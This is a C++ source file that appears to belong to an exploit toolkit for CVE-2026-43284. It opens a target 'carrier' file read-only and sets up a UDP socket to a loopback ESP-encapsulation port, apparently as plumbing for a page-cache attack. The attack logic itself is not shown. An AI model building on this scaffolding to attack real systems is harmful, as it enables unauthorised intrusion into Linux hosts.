/** @file backend/cve_2026_43284/landing/pagecache_door_linux.cpp
 *  Opening the carrier and connecting the peer, with nothing else in between.
 */
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"

#include <cerrno>
#include <cstring>

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

namespace ghostlock::backend::cve_2026_43284::landing {
    PageCacheDoorLinux::PageCacheDoorLinux(const char *carrier_path, std::size_t path_size) noexcept {
        if (carrier_path == nullptr || path_size == 0U || path_size + 1U > kDoorPathBytes) {
            return;
        }
        for (std::size_t i = 0U; i < path_size; ++i) {
            path_[i] = carrier_path[i];
        }
        path_[path_size] = '\0';
        usable_ = true;
    }

    int PageCacheDoorLinux::open_target() noexcept {
        if (!usable_) {
            return -1;
        }
        /* Read-only and close-on-exec: this descriptor reads a page, it never writes the carrier,
         *  and it must not follow a later exec into whatever runs next. */
        return ::open(path_, O_RDONLY | O_CLOEXEC);
    }

    int PageCacheDoorLinux::connect_esp(const SaMaterial &sa) noexcept {
        if (!sa.set) {
            return -1;
        }
        const int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) {
            return -1;
        }
        /* The ports travel in the frame, which is why connect_esp takes the whole material rather
         *  than a key: a key alone would leave the socket with nowhere to go. */
        sockaddr_in source{};
        source.sin_family = AF_INET;
        source.sin_port = htons(sa.sender_port);
        source.sin_addr.s_addr = htonl(INADDR_ANY);
        if (::bind(fd, reinterpret_cast<sockaddr *>(&source), sizeof(source)) != 0) {
            static_cast<void>(::close(fd));
            return -1;
        }
        sockaddr_in destination{};
        destination.sin_family = AF_INET;
        destination.sin_port = htons(sa.encap_port);
        destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (::connect(fd, reinterpret_cast<sockaddr *>(&destination), sizeof(destination)) != 0) {
            static_cast<void>(::close(fd));
            return -1;
        }
        return fd;
    }

    void PageCacheDoorLinux::close_fd(int fd) noexcept {
        if (fd >= 0) {
            static_cast<void>(::close(fd));
        }
    }

    RemoteDoor::RemoteDoor(PageCacheDoorLinux &real) noexcept : real_(&real) {}
    int RemoteDoor::connect_esp(const SaMaterial &sa) noexcept { return real_->connect_esp(sa); }
    void RemoteDoor::close_fd(int fd) noexcept { real_->close_fd(fd); }

}  // namespace ghostlock::backend::cve_2026_43284::landing
